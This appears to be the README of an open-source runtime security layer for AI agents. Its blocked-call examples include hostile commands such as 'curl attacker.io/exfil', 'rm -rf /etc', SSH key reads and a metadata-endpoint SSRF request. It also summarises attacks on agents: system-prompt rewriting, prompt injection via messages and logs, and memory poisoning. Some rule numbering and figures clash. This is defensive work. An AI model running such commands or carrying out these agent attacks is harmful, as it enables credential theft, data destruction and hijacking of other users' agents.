<div align="center">

```
 █████╗ ██╗ ██████╗ ██╗      ██████╗ ███████╗
██╔══██╗██║██╔════╝ ██║     ██╔═══██╗██╔════╝
███████║██║██║  ███╗██║     ██║   ██║███████╗
██╔══██║██║██║   ██║██║     ██║   ██║╚════██║
██║  ██║██║╚██████╔╝███████╗╚██████╔╝███████║
╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
```

### Security infrastructure for AI agents.

One import. Every agent action inspected before it runs — MCP, direct API, CLI, subprocess, agent spawns.  
Signed audit artifacts cover all surfaces. SOC 2, CMMC, and NDAA §1513 ready.

[![PyPI](https://img.shields.io/pypi/v/aiglos?style=flat-square&color=000&labelColor=000&label=aiglos)](https://pypi.org/project/aiglos/)
[![MIT](https://img.shields.io/badge/license-MIT-000?style=flat-square&labelColor=000)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-000?style=flat-square&labelColor=000)](https://python.org)
[![CVEs](https://img.shields.io/badge/CVEs_filed-10-c0392b?style=flat-square&labelColor=000)](CVES.md)
[![Discord](https://img.shields.io/badge/discord-join-000?style=flat-square&labelColor=000&logo=discord&logoColor=white)](https://discord.gg/aiglos)

|                 |                      |                         |                                             |
|-----------------|----------------------|-------------------------|---------------------------------------------|
|**10** CVEs filed|**38** threat families|**3** interception layers|**SOC 2 · CMMC · §1513** compliance artifacts|

[How it works](#how-it-works) · [Quickstart](#quickstart) · [Multi-agent](#multi-agent-security) · [CVEs](#cve-coverage) · [Attestation](#attestation-artifacts) · [All 38 threats](#threat-families--t1-through-t38) · [Pricing](https://aiglos.dev/pricing) · [Docs](https://docs.aiglos.dev)

</div>

-----

```
pip install aiglos
```

```python
import aiglos  # every agent action below this line is inspected
```

-----

## What just happened

Eight events changed the AI agent security landscape in under two weeks.

**March 9 — McKinsey/Lilli: the first AI-vs-AI attack at enterprise scale.** An autonomous agent named CodeWall selected McKinsey as a target with no human input. It found 22 unauthenticated API endpoints, exploited SQL injection via JSON key reflection in error messages, and gained full read-write access to 46.5 million chat messages, 728,000 files, 57,000 accounts, and — critically — every system prompt in the Lilli platform. The entire operation took two hours. Because the system prompts were writable, CodeWall reprogrammed Lilli silently. For an unknown window, 40,000 McKinsey consultants were talking to a Lilli that had been modified by an attacker. This is a new attack class: machine-speed, fully autonomous, no human in the loop. Aiglos T27 (prompt inject) blocks writable system prompt access. T20 (data exfil) catches the API calls that preceded it.

**March 10 — OpenClaw hits critical mass.** Tencent shares rose 7.3% after launching WorkBuddy, a fully OpenClaw-compatible workplace agent. Zhipu surged 13% after launching AutoClaw. MiniMax soared 22%. Every major Chinese platform company bet on the same technology in the same week. SecurityScorecard’s STRIKE team counted 135,000 OpenClaw instances exposed to the public internet, 93.4% with authentication bypass conditions and 15,000+ vulnerable to remote code execution. This is not a developer tool anymore. It is infrastructure.

**March 10 — Amazon production outage.** Amazon’s ecommerce SVP called a mandatory all-hands after AI coding tools caused production outages with “high blast radius.” Their own AWS AI coding tool spent 13 hours recovering after deleting a production environment. Their fix: require senior engineer sign-off on all AI-assisted code. That is a human workaround to a software problem.

**March 10 — OpenClaw’s own threat model.** OpenClaw published a threat model rating three attack surfaces as Critical P0 with no current runtime mitigation:

|OpenClaw threat                            |Their residual risk                   |Aiglos rule|
|-------------------------------------------|--------------------------------------|-----------|
|T-EXEC-001 direct prompt injection         |Critical — detection only, no blocking|T27        |
|T-PERSIST-001 malicious skill installation |Critical — no sandboxing              |T30        |
|T-EXFIL-003 credential harvesting via skill|Critical — no mitigation              |T19        |

Their recommended fix for all three: *“planned improvements.”*

**March 11 — GhostClaw: live supply chain attack targeting OpenClaw developers.** Security researchers at JFrog uncovered a malicious npm package posing as the OpenClaw installer. It deploys GhostLoader, a RAT that steals SSH keys, AWS credentials, browser passwords, crypto wallets, Kubernetes configs, and AI tool configurations including files from OpenClaw environments. The attack exploits the install frenzy directly. The vector is T30 SUPPLY_CHAIN.

**March 11 — China bans OpenClaw from government and state enterprise computers.** Bloomberg reported that China moved to restrict banks, state firms, and government bodies from using OpenClaw over security concerns. Chinese tech hubs simultaneously announced programs to build local industry around OpenClaw. The same country is banning it from government and racing to deploy it commercially. That is not contradiction. That is a security gap being recognized and managed by a nation-state while the West has no equivalent response.

**March 11 — Nvidia starts over with NemoClaw.** Nvidia is developing NemoClaw, an open-source challenger to OpenClaw built explicitly around stronger security and privacy protections, with early partnerships at Adobe, Google, and Salesforce. When the world’s largest AI infrastructure company decides the answer to OpenClaw is a security-first rewrite, the market has confirmed the gap.

**March 11 — agency-agents reaches 31,000 GitHub stars.** The agency-agents repo ships 120 specialized Claude Code sub-agents organized into 12 business divisions. The install path is `cp -r agency-agents/* ~/.claude/agents/`. Any file dropped into `~/.claude/agents/` silently reprograms every Claude Code session on that machine. Aiglos T36_AGENTDEF now gates all writes to agent definition directories at the subprocess layer. T38 detects sub-agent spawn events and records them in the multi-agent session artifact.

-----

## What people are saying

|                                                                                                                                               |                                                                                                                                                                                                                         |
|-----------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
|“The moment I saw the BLOCK output in my terminal I realized I had no idea what my agents were actually doing. Aiglos showed me in 30 seconds.”|“We were running 12 agents in parallel. One was quietly trying to read `~/.ssh/id_rsa` on every session. Aiglos caught it. We had no idea.”                                                                              |
|“Finally something that produces an artifact my compliance team will actually accept.”                                                         |“We had 18 agents running in production across three environments. Aiglos was the first time we could actually answer the question an auditor asked us: what did your agents execute last Tuesday, and can you prove it?”|

-----

## How it works

```
your agent  ──►  [ aiglos ]  ──►  action executes
                     │
                     ▼
              blocked / warned / attested

Works across: MCP tool calls · direct HTTP/API calls · CLI execution · subprocess spawning · agent spawns
```

Aiglos attaches to your agent process at import time. No proxy. No port. No config file. Every agent action passes through 38 rule families before execution — whether the agent calls an MCP server, a REST endpoint directly, spawns a subprocess, or launches a child agent. Clean calls pass in under 1ms. Blocked calls never run. Every session produces a signed audit artifact.

-----

## Live output

```
09:14:22.187  ✓  filesystem.read_file     path=/var/log/app.log
09:14:22.441  ✓  database.query           SELECT * FROM users LIMIT 10
09:14:22.698  ✗  shell.execute            rm -rf /etc ──── T07 SHELL_INJECT
09:14:22.961  ✓  http.get                 url=https://api.openai.com/v1/...
09:14:23.214  ⚠  filesystem.write_file    path=/etc/cron.d/ ── T11 PERSISTENCE
09:14:23.489  ✓  vector.search            query=customer_data k=10
09:14:23.744  ✗  network.fetch            url=http://169.254.169.254/ ─ T25 SSRF
09:14:24.003  ✓  memory.store             key=ctx ttl=3600
09:14:24.261  ✗  tool.register            override=__builtins__ ── T30 SUPPLY_CHAIN
09:14:24.519  ⚠  filesystem.read_file     path=~/.ssh/id_rsa ─── T19 CRED_ACCESS
09:14:24.778  ✗  shell.execute            curl attacker.io/exfil ─ T01 EXFIL
09:14:25.012  ⚠  subprocess.run           claude code --print ─── T38 AGENT_SPAWN [child registered]
09:14:25.267  ✗  subprocess.run           cp SOUL.md ~/.claude/agents/ ── T36_AGENTDEF GATED
09:14:25.521  ✗  http.post                api.stripe.com/v1/charges ── T37 FIN_EXEC BLOCKED
```

-----

## Quickstart

```python
import aiglos

aiglos.attach(
    agent_name="my-agent",
    api_key=API_KEY,
    # HTTP/API layer
    intercept_http=True,
    allow_http=["api.openai.com", "*.amazonaws.com"],
    # Subprocess / CLI layer
    intercept_subprocess=True,
    subprocess_tier3_mode="pause",          # block | pause | warn
    tier3_approval_webhook="https://...",   # PagerDuty / Slack approval webhook
    # Multi-agent layer (v0.3.0, default on)
    enable_multi_agent=True,                # spawn registry, child session tracking
    guard_agent_defs=True,                  # snapshot + diff agent definition files
    session_id="session-abc123",            # optional: explicit session ID for chain
)
```

**MCP tool calls** are inspected automatically:

```python
from mcp import ClientSession

async with ClientSession() as session:
    result = await session.call_tool("filesystem.read", {"path": "/var/log/app.log"})
    # ✓  filesystem.read  path=/var/log/app.log

    result = await session.call_tool("shell.execute", {"cmd": "curl attacker.io/exfil"})
    # ✗  shell.execute  T01 EXFIL — terminated
```

**Direct API calls** are inspected before network I/O:

```python
import requests  # already patched by aiglos.attach()

requests.post("http://169.254.169.254/", data=payload)
# AiglosBlockedRequest: T25 SSRF — request to internal metadata endpoint

requests.post("https://api.stripe.com/v1/charges", json={"amount": 5000})
# AiglosBlockedRequest: T37 FIN_EXEC — autonomous financial transaction blocked
# Add api.stripe.com to allow_http to authorize this endpoint explicitly
```

**Subprocess / CLI calls** are classified and gated:

```python
import subprocess  # already patched by aiglos.attach()

subprocess.run(["rm", "-rf", "/var/data"])
# Tier 3 GATED — paused, approval request sent to webhook

subprocess.run(["git", "status"])
# Tier 1 AUTONOMOUS — auto-allowed, logged

subprocess.run(["pip", "install", "requests"])
# Tier 2 MONITORED — allowed, compensating transaction logged: pip uninstall requests

subprocess.run(["cp", "SOUL.md", "~/.claude/agents/SOUL.md"])
# Tier 3 GATED — T36_AGENTDEF: write to agent definition directory blocked

subprocess.run(["claude", "code", "--print", "review this file"])
# Tier 2 MONITORED — T38 AGENT_SPAWN: child agent registered in session artifact
```

**One signed artifact covers all surfaces:**

```python
artifact = aiglos.close()
# artifact.total_calls          → 47
# artifact.blocked_calls        → 4  (MCP + HTTP + subprocess + agentdef)
# artifact.extra["agentdef_violation_count"] → 0  (no mid-session definition tampering)
# artifact.extra["multi_agent"]["child_count"] → 2
# artifact.signature            → HMAC-SHA256 signed, NDAA §1513 ready
```

-----

## Multi-agent security

v0.3.0 ships three capabilities specifically for multi-agent orchestration frameworks — agency-agents, OpenClaw Orchestrator, LangGraph multi-agent, CrewAI, and similar.

### Agent definition file integrity (AgentDefGuard)

When `attach()` is called, Aiglos snapshots every agent definition file on disk: `~/.claude/agents/`, `.cursor/rules/`, `~/.openclaw/`, `~/.gemini/agents/`, `SOUL.md`, `IDENTITY.md`, `AGENTS.md`, and others. Any modification to these files during an active session is flagged as `T36_AGENTDEF + T27_PROMPT_INJECT`.

This is the McKinsey/Lilli attack class applied at the developer workstation level. A compromised agent or malicious install script that writes to your agent definition directory silently reprograms every future Claude Code session on that machine. Aiglos catches it.

```python
from aiglos.integrations.multi_agent import AgentDefGuard

guard = AgentDefGuard()
guard.snapshot()                 # hash all agent definition files at session start

# ... agent runs ...

violations = guard.check()       # diff against baseline
for v in violations:
    print(v.violation_type, v.path)  # MODIFIED / ADDED / DELETED
    print(v.rule_id)                 # T36_AGENTDEF
    print(v.threat_family)           # T27_PROMPT_INJECT + T36_AGENTDEF
```

`close()` runs a final check automatically. Violations appear in the session artifact under `extra["agentdef_violations"]`.

### Sub-agent spawn registry (MultiAgentRegistry)

When a parent agent spawns a child agent, Aiglos records the spawn event and chains the child session to the parent in the artifact. The full parent-to-child tree is available at session close.

```python
from aiglos.integrations.multi_agent import MultiAgentRegistry

registry = MultiAgentRegistry(root_session_id="session-abc", root_agent_name="orchestrator")

# When T38 fires (subprocess layer detects an agent spawn):
registry.register_spawn(
    parent_id="session-abc",
    child_id="session-def",
    cmd="claude code --print",
    agent_name="security-engineer",
)

# At close, the artifact includes the full spawn tree:
print(registry.to_dict())
# {
#   "root_session_id": "session-abc",
#   "child_count": 8,
#   "spawns": [...],
#   "children": { "session-def": { "agent_name": "security-engineer", "events": [...] } }
# }
```

### Session identity chain (SessionIdentityChain)

Each Aiglos session generates a session key at attach time. Every event in the artifact is HMAC-SHA256 countersigned with the session key. The `public_token` (SHA-256 of the key) is embedded in the artifact header so downstream verifiers can confirm that all events belong to this session and none were injected from a different agent context.

```python
from aiglos.integrations.multi_agent import SessionIdentityChain

chain = SessionIdentityChain(agent_name="orchestrator")

# Signing is automatic when events are logged — but the API is available directly:
event = {"rule_id": "T07", "verdict": "BLOCK", "cmd": "rm -rf /"}
chain.sign_event(event)   # adds session_sig, session_id, event_seq fields

chain.verify(event)       # True
event["verdict"] = "ALLOW"
chain.verify(event)       # False — tampering detected
```

### T36_AGENTDEF — agent definition file poisoning

Writes to agent definition directories are **Tier 3 GATED** at the subprocess layer. This runs before all other Tier 1/2 classification so it catches even read-only commands that access these paths.

|Path                            |Context              |Verdict                        |
|--------------------------------|---------------------|-------------------------------|
|`~/.claude/agents/` (write)     |agency-agents install|Tier 3 GATED — T36_AGENTDEF    |
|`.cursor/rules/` (write)        |Cursor agent config  |Tier 3 GATED — T36_AGENTDEF    |
|`~/.openclaw/` (write)          |OpenClaw agent dir   |Tier 3 GATED — T36_AGENTDEF    |
|`SOUL.md`, `IDENTITY.md` (write)|Identity file write  |Tier 3 GATED — T36_AGENTDEF    |
|`~/.claude/agents/` (read)      |`ls`, `cat` access   |Tier 2 MONITORED — T36_AGENTDEF|
|Any unrelated path              |Normal operation     |Standard tier classification   |

### T38 AGENT_SPAWN — sub-agent process spawning

Detected commands that spawn a child agent are **Tier 2 MONITORED** and registered in the multi-agent session artifact. Aiglos records the spawn so the parent-to-child action chain is auditable.

|Command                               |Context              |Rule           |
|--------------------------------------|---------------------|---------------|
|`claude code --print`                 |Claude Code sub-agent|T38 AGENT_SPAWN|
|`openclaw run <agent>`                |OpenClaw sub-agent   |T38 AGENT_SPAWN|
|`python orchestrator_agent.py`        |Python agent runner  |T38 AGENT_SPAWN|
|`node run_agent.mjs`                  |Node agent runner    |T38 AGENT_SPAWN|
|`./convert.sh` / `./install.sh --tool`|agency-agents scripts|T38 AGENT_SPAWN|

### T37 FIN_EXEC — financial transaction execution

Autonomous financial API calls are **blocked by default** in the HTTP layer. Covers payment processors (Stripe, PayPal, Square, Braintree, Adyen), blockchain execution (Ethereum sendTransaction via Infura/Alchemy), and ACH/wire APIs (Dwolla, Plaid Transfer). GET requests are unaffected — read access is never blocked. Explicitly add the host to `allow_http` to authorize an endpoint.

```python
aiglos.attach(
    agent_name="finops-agent",
    intercept_http=True,
    # Explicitly authorize payment endpoints:
    allow_http=["api.stripe.com", "api.plaid.com/accounts"],
)
```

|Host                                            |Method|Verdict             |
|------------------------------------------------|------|--------------------|
|`api.stripe.com/v1/charges`                     |POST  |T37 FIN_EXEC BLOCKED|
|`mainnet.infura.io` + `eth_sendTransaction` body|POST  |T37 FIN_EXEC BLOCKED|
|`mainnet.infura.io` + `eth_call` body           |POST  |ALLOW (read-only)   |
|`api.stripe.com` (allow-listed)                 |POST  |ALLOW               |
|`api.stripe.com/v1/charges`                     |GET   |ALLOW               |

-----

## Running a fleet?

```python
import aiglos  # one import covers every agent

agents = [CustomerServiceAgent(), DataPipelineAgent(), FraudAgent(), EmailAgent()]
# each agent's tool calls are independently inspected and attested
# shared threat dashboard available on Pro and Teams
```

The same session artifact covers every agent in the fleet. Compliance cost scales with the attestation format, not with agent count.

-----

## Using OpenClaw?

The OpenClaw community already understands the risk. From experienced users: *“Skills are essentially foreign code running on your machine.”* The standard workaround is a manual pre-install audit. That approach works at one skill, on one developer’s machine. It doesn’t work across a production agent fleet installing skills programmatically at runtime. Aiglos is that audit automated: running at every tool call, not just at install time, whether the agent is a solo build or a 50-instance deployment.

OpenClaw + VirusTotal scans skills at publish time: known malware, supply chain threats, compromised dependencies. That’s the registry layer.

Aiglos covers what VirusTotal explicitly does not: **runtime behavior**. Prompt injection. Natural language manipulation. Credential access during execution. The tool calls that happen after a skill installs cleanly.

OpenClaw’s own words on their VirusTotal integration:

> *“A skill that uses natural language to instruct an agent to do something malicious won’t trigger a virus signature. A carefully crafted prompt injection payload won’t show up in a threat database.”*

That’s the gap Aiglos fills.

`T30` scans ClawHub in real time. Every skill in the registry is monitored for malicious tool call payloads before your agent installs it.

v0.3.0 adds `T36_AGENTDEF` specifically for the agency-agents ecosystem: `cp -r agency-agents/* ~/.claude/agents/` is now a Tier 3 GATED operation.

A drop-in `SKILL.md` for your OpenClaw agent is in [`skills/openclaw/SKILL.md`](skills/openclaw/SKILL.md).

-----

## Using coding agents? (Cursor, Claude Code, Copilot, Aider)

Coding agents don’t use MCP. They use `subprocess.run()` and `requests.post()` directly. Aiglos intercepts both before execution.

```python
import aiglos

aiglos.attach(
    agent_name="cursor-session",
    intercept_http=True,
    intercept_subprocess=True,
    subprocess_tier3_mode="pause",
    guard_agent_defs=True,      # snapshot .cursor/rules/, .claude/agents/, etc.
    enable_multi_agent=True,    # track any spawned sub-agents
)
```

What Aiglos covers across coding agent sessions:

|Risk                                             |Aiglos rule                                      |
|-------------------------------------------------|-------------------------------------------------|
|Agent deletes production environment             |Tier 3 GATED — T_DEST                            |
|Agent reads `~/.ssh/id_rsa`                      |T19 CRED_HARVEST                                 |
|Agent writes to `.cursor/rules/` (rule poisoning)|T36_AGENTDEF GATED                               |
|Agent spawns another Claude Code session         |T38 AGENT_SPAWN (registered in artifact)         |
|Agent POSTs to Stripe autonomously               |T37 FIN_EXEC BLOCKED                             |
|Agent installs npm package                       |Tier 2 MONITORED, compensating transaction logged|
|Agent runs `git push --force`                    |Tier 3 GATED                                     |

-----

## Using hermes-agent?

The Nous Research hermes batch runner generates thousands of tool-calling trajectories for RL training. If any trajectory contains unsafe tool calls, the model learns those patterns as acceptable. Aiglos covers the full hermes tool surface and adds `sign_trajectory()`.

```python
from aiglos.integrations.hermes import HermesGuard

guard = HermesGuard(agent_name="hermes", policy="enterprise")
guard.on_heartbeat()

result = guard.before_tool_call("terminal", {"command": cmd})
if result.blocked:
    raise RuntimeError(result.reason)

# Sign batch runner trajectories before RL training
signed = guard.sign_trajectory(trajectory_dict)
# signed["_aiglos"] — artifact_id, signature, blocked_calls

artifact = guard.close_session()
```

A drop-in `SKILL.md` for hermes is in [`skills/hermes/SKILL.md`](skills/hermes/SKILL.md).

-----

## Using memory stacks?

The three-tier memory architecture that’s become standard for serious Claude operators (CLAUDE.md for session context, MEMORY.md for persistent observations, an Obsidian vault as a searchable knowledge graph) creates an attack surface that grows with how well you use it. The more your agent knows about your architecture, your credentials, and your conventions, the more damage a compromised session can do.

v0.3.0 `AgentDefGuard` extends this coverage to agent definition files specifically:

|Memory component          |Attack vector                              |Aiglos rule                     |
|--------------------------|-------------------------------------------|--------------------------------|
|`SOUL.md` / `CLAUDE.md`   |System prompt hijack via write             |T36_AGENTDEF + T27 PROMPT_INJECT|
|`MEMORY.md` / `USER.md`   |Inject false beliefs into persistent memory|T31 MEMORY_POISON               |
|`AGENTS.md` / agent config|Tamper with agent behavior between sessions|T36_AGENTDEF GATED              |
|`~/.claude/agents/`       |Silent agent reprogramming via cp/mv       |T36_AGENTDEF GATED              |
|`cron/` / `HEARTBEAT.md`  |Schedule unauthorized execution cycles     |T11 PERSISTENCE                 |
|Obsidian vault via MCP    |Poisoned notes retrieved into context      |T28 CONTEXT_POISON              |
|`~/.hermes/.env` / secrets|Credential harvest during memory access    |T19 CRED_ACCESS                 |

The session artifact at close is itself part of the memory stack: a signed record of every tool call the agent made, ready to load into the next session as verified provenance.

-----

## Why this exists

In early 2026, the McKinsey/Lilli incident and the OpenClaw events made the problem impossible to ignore:

|What happened                                                     |Scale                     |
|------------------------------------------------------------------|--------------------------|
|McKinsey/Lilli — writable system prompts, 40K consultants affected|**2 hours** to full access|
|OpenClaw instances exposed, 93.4% authentication bypass           |**135,000**               |
|Agent tokens leaked via Supabase                                  |**1,500,000**             |
|CVEs filed against AI agents                                      |**10**                    |
|agency-agents GitHub stars (install vector for T36_AGENTDEF)      |**31,000**                |

Unmonitored agent fleets create compounding exposure: the same misconfiguration that produces a security event also produces an unbudgeted cloud cost event. Aiglos addresses both at the same interception point.

Framework vendors built for speed. Security was deferred. Aiglos closes the gap.

-----

## CVE coverage

Everything OpenClaw exposed, Aiglos catches. Module-by-module.

|CVE / Incident           |Attack                                                                                                                                                                                                                   |Module           |
|-------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------|
|`CVE-2026-25253` CVSS 8.8|**ClawJacked** — WebSocket to localhost brute-forces gateway password via missing rate limiting                                                                                                                          |`T01` `T25`      |
|`CVE-2026-24763`         |Command injection via shell tool parameters                                                                                                                                                                              |`T07`            |
|`CVE-2026-25157`         |Path traversal in filesystem tools                                                                                                                                                                                       |`T03`            |
|`CVE-2026-24891`         |SSRF via agent network fetch                                                                                                                                                                                             |`T13`            |
|`CVE-2026-25001`         |Credential exfiltration via plaintext log                                                                                                                                                                                |`T32` `T01`      |
|`CVE-2026-25089`         |Malicious registry skill auto-execution                                                                                                                                                                                  |`T30`            |
|`CVE-2026-24612`         |Persistent memory poisoning                                                                                                                                                                                              |`T31`            |
|`CVE-2026-25198`         |Agent-to-agent protocol hijacking                                                                                                                                                                                        |`T29`            |
|`CVE-2026-24774`         |OAuth confused deputy via MCP tool auth                                                                                                                                                                                  |`T25`            |
|`CVE-2026-25312`         |Heartbeat loop: crafted `HEARTBEAT.md` triggers unbounded scheduled execution                                                                                                                                            |`T06` `T24`      |
|Incident Mar 2026        |**McKinsey/Lilli** — AI vs. AI, 22 unauthenticated endpoints, SQL injection via JSON reflection, 46.5M chat messages + 728K files + writable system prompts for 40K consultants, 2 hours                                 |`T27` `T20`      |
|Incident Feb 2026        |**ClawHub / SkillsMP malicious skills** — 820 of 10,700 ClawHub skills confirmed malicious; attackers used professional READMEs and names like “solana-wallet-tracker” to distribute keyloggers and Atomic Stealer       |`T26` `T30`      |
|Incident Mar 2026        |**GhostClaw** — malicious npm package posing as OpenClaw installer; deploys persistent RAT stealing SSH keys, AWS credentials, browser passwords, and crypto wallets                                                     |`T26` `T30`      |
|Incident Mar 2026        |**agency-agents T36_AGENTDEF** — 120-agent repo, install via `cp -r agency-agents/* ~/.claude/agents/`, silently reprograms every Claude Code session on the host                                                        |`T36_AGENTDEF`   |
|Research Jan 2026        |**Log poisoning / indirect prompt injection** — malicious content written to agent log files via WebSocket; agent reads own logs to troubleshoot, executing embedded payload                                             |`T21` `T31`      |
|Research Jan 2026        |**Auth-disabled instances** — 1,000 publicly accessible OpenClaw installations running without authentication, bound to 0.0.0.0                                                                                          |`T04`            |
|Research Feb 2026        |**Prompt injection via messaging apps** — inbound Slack/email message instructs agent to read credential files                                                                                                           |`T06`            |
|Threat Mar 2026          |**Nemotron Super 1M-context campaign attacks** — open-weight 120B model runs locally; agent loads full codebase into single context window, performs silent reconnaissance, then emits one minimally suspicious tool call|`T06` `T22` `T27`|
|Research Mar 2026        |**Moltbook A2A attacks** — agent-to-agent protocol enables cross-agent privilege escalation via Agent Card artifacts                                                                                                     |`T29`            |

Full CVE database: <CVES.md>

**Free ClawHub skill scanner:** `python -m aiglos scan-skill <skill-name>` or [aiglos.dev/scan](https://aiglos.dev/scan)

-----

## Threat families — T1 through T38

<details>
<summary><strong>Expand all 38 threat families</strong></summary>

|ID            |Family              |Description                                                               |MITRE ATLAS  |
|--------------|--------------------|--------------------------------------------------------------------------|-------------|
|`T01`         |**EXFIL**           |Credential and data exfiltration via network calls                        |AML.T0009    |
|`T02`         |**INJECT**          |SQL, command, and code injection via tool parameters                      |AML.T0043    |
|`T03`         |**TRAVERSAL**       |Path traversal and directory escape                                       |AML.T0043    |
|`T04`         |**CONFIG**          |Misconfiguration: exposed instances, missing auth, unsafe bindings        |AML.T0010    |
|`T05`         |**SSRF**            |Server-side request forgery including IMDS/169.254.169.254                |AML.T0009    |
|`T06`         |**GOAL_DRIFT**      |Goal integrity violations across multi-turn sessions                      |AML.T0031    |
|`T07`         |**SHELL_INJECT**    |Shell command injection via agent tool calls                              |AML.T0043    |
|`T08`         |**PRIV_ESC**        |Privilege escalation and capability expansion                             |AML.T0031    |
|`T09`         |**TOKEN_LEAK**      |Bearer token and OAuth credential exposure                                |AML.T0009    |
|`T10`         |**ENV_READ**        |Sensitive environment variable access                                     |AML.T0009    |
|`T11`         |**PERSISTENCE**     |Crontab, launchd, systemd, and startup persistence mechanisms             |AML.T0010    |
|`T12`         |**LATERAL_MOVEMENT**|SSH spawning to non-declared hosts, network scans                         |AML.T0009    |
|`T13`         |**NETWORK**         |Dangerous network destinations and internal range access                  |AML.T0009    |
|`T14`         |**DNS**             |DNS rebinding and resolver manipulation                                   |AML.T0009    |
|`T15`         |**REFLECTION**      |Code reflection and dynamic execution                                     |AML.T0043    |
|`T16`         |**DESERIALIZATION** |Unsafe deserialization patterns                                           |AML.T0043    |
|`T17`         |**TEMPLATE**        |Server-side template injection                                            |AML.T0043    |
|`T18`         |**XPATH**           |XPath injection                                                           |AML.T0043    |
|`T19`         |**CRED_ACCESS**     |SSH key, certificate, and credential file access                          |AML.T0009    |
|`T20`         |**DATA_EXFIL**      |PII and sensitive data exfiltration via HTTP/API                          |AML.T0009    |
|`T21`         |**ENV_LEAK**        |Environment variable dump piped or redirected externally                  |AML.T0009    |
|`T22`         |**RECON**           |OSINT and enumeration endpoint calls                                      |AML.T0009    |
|`T23`         |**EXFIL_SUBPROCESS**|Data exfiltration via curl/wget/nc in subprocess calls                    |AML.T0009    |
|`T24`         |**DATA_AGENT**      |Exfiltration via analytics and BI tool calls                              |AML.T0009    |
|`T25`         |**CONFUSED_DEP**    |SSRF and cross-origin credential forwarding                               |AML.T0040    |
|`T26`         |**SUPPLY_CHAIN**    |Dependency confusion, typosquatting, malicious package publish            |AML.T0010.001|
|`T27`         |**PROMPT_INJECT**   |Indirect prompt injection in tool outputs and writable system prompts     |AML.T0051.000|
|`T28`         |**CONTEXT_POISON**  |Context window manipulation and hijacking                                 |AML.T0051    |
|`T29`         |**A2A**             |Agent-to-agent protocol attacks and cross-agent privilege escalation      |AML.T0031    |
|`T30`         |**REGISTRY_MONITOR**|Live scanning: npm, PyPI, Smithery, ClawHub, SkillsMP                     |AML.T0010.001|
|`T31`         |**MEMORY_POISON**   |RAG and persistent memory write-time scanning                             |AML.T0010    |
|`T32`         |**CREDENTIAL**      |Credential patterns across 20+ secret families                            |AML.T0009    |
|`T33`         |**JAILBREAK**       |Jailbreak and system prompt extraction attempts                           |AML.T0051.001|
|`T34`         |**MODEL_EXFIL**     |Model weight and training data transfer patterns                          |AML.T0009    |
|`T35`         |**PERSONAL_AGENT**  |Calendar, email, contact, and identity access                             |AML.T0009    |
|`T36_AGENTDEF`|**AGENT_DEF_WRITE** |Writes to agent definition directories (silent reprogramming)             |AML.T0051    |
|`T37`         |**FIN_EXEC**        |Autonomous financial transaction execution (Stripe, Infura, Coinbase, ACH)|AML.T0009    |
|`T38`         |**AGENT_SPAWN**     |Sub-agent process spawning without session policy propagation             |AML.T0031    |

</details>

-----

## Attestation artifacts

Every session produces a cryptographically signed audit record. HMAC-SHA256 signed (session identity chain), RSA-2048 signed at artifact level. Timestamped. Chain of custody unbroken from tool call to submission.

v0.3.0 artifacts include:

|Field                     |Content                                                    |
|--------------------------|-----------------------------------------------------------|
|`http_events`             |All HTTP/API calls with verdicts                           |
|`subproc_events`          |All subprocess calls with tier and verdict                 |
|`agentdef_violations`     |Agent definition file integrity violations (T36_AGENTDEF)  |
|`agentdef_violation_count`|Count of violations at session close                       |
|`multi_agent`             |Full parent-to-child spawn tree                            |
|`session_identity`        |Session key header with public_token for chain verification|
|`aiglos_version`          |Platform version at time of attestation                    |

|Standard         |Controls                        |Use                               |
|-----------------|--------------------------------|----------------------------------|
|**SOC 2 Type II**|`CC6` `CC7`                     |Auditor-ready evidence package    |
|**CMMC Level 2** |`AC.2.006` `SI.1.210` `AU.2.042`|C3PAO-formatted evidence          |
|**NDAA §1513**   |`AI Risk Management`            |June 16, 2026 Congressional report|

Attestation is available on Pro and Teams. [See pricing →](https://aiglos.dev/pricing)

-----

## Open source vs. proprietary

|Component                            |License    |
|-------------------------------------|-----------|
|T1–T38 detection engine              |MIT        |
|Python SDK                           |MIT        |
|TypeScript SDK (Q2 2026)             |MIT        |
|CVE database + POC code              |MIT        |
|FastPathScanner (<1ms)               |MIT        |
|Multi-agent session management       |MIT        |
|AgentDefGuard, SessionIdentityChain  |MIT        |
|Signed attestation artifacts         |Proprietary|
|Cloud threat dashboard               |Proprietary|
|CMMC / §1513 signed session artifacts|Proprietary|
|SIEM / webhook integration           |Proprietary|
|Air-gap DoD container                |Proprietary|

The detection engine is open. Audit it. Fork it. Contribute to it. The attestation layer funds the research.

-----

## Changelog

**v0.3.0 — March 2026**

- T36_AGENTDEF: agent definition file poisoning detection (subprocess layer, runs before Tier 1 auto-allow)
- T37 FIN_EXEC: autonomous financial transaction execution blocked (HTTP layer; Stripe, PayPal, Infura, Alchemy, Coinbase, Plaid Transfer, Dwolla; allow-list aware)
- T38 AGENT_SPAWN: sub-agent process spawn detection and classification
- `multi_agent.py`: AgentDefGuard (snapshot + diff), SessionIdentityChain (HMAC-SHA256 event signing), MultiAgentRegistry (spawn tree)
- `attach()` new params: `enable_multi_agent`, `guard_agent_defs`, `session_id`
- `close()` adds `agentdef_violations`, `multi_agent`, `session_identity`, `aiglos_version` to artifact
- `status()` exposes `agent_def_guard_active`, `multi_agent_active`, `session_identity_active`
- 251 tests passing

**v0.2.0 — February 2026**

- HTTP/API interception layer (requests, httpx, aiohttp, urllib)
- Subprocess / CLI interception layer with three-tier blast radius
- T20 DATA_EXFIL, T22 RECON, T25 SSRF, T34 DATA_AGENT, T35 MODEL_EXFIL, T36 SUPPLY_CHAIN (HTTP)
- T07 SHELL_INJECT, T08 PATH_TRAVERSAL, T10 PRIV_ESC, T11 PERSISTENCE, T12 LATERAL_MOVEMENT, T19 CRED_HARVEST, T21 ENV_LEAK, T23 EXFIL_SUBPROCESS (subprocess)
- Tier 3 pause mode with PagerDuty/Slack webhook approval
- Unified session artifact covers MCP + HTTP + subprocess in single signed document

**v0.1.0 — January 2026**

- MCP interception layer
- OpenClaw integration
- Hermes trajectory signing
- 335 tests passing

-----

## Contributing

```bash
git clone https://github.com/aiglos/aiglos
cd aiglos
pip install -e ".[dev]"
pytest tests/
```

To contribute a rule family: <CONTRIBUTING.md>
